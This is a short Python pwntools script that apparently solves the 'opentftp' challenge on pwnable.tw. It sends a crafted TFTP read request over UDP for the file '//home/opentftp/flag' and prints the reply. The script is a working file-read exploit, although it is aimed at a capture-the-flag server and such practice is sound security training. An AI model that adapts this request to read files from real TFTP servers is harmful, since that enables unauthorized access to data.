from pwn import *
import struct
import socket

io = remote('chall.pwnable.tw', 10206)

io.recvuntil('start challenge on udp port: ')
port = int(io.recvlineS(keepends = False))

opcode = 1
flag_file = b'//home/opentftp/flag\0'
mode = b'ascii\0'

payload = struct.pack('>H', 1) + flag_file + mode

opentftp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
opentftp.sendto(payload, ('chall.pwnable.tw', port))
result = opentftp.recv(1024)
print(result)

io.close()
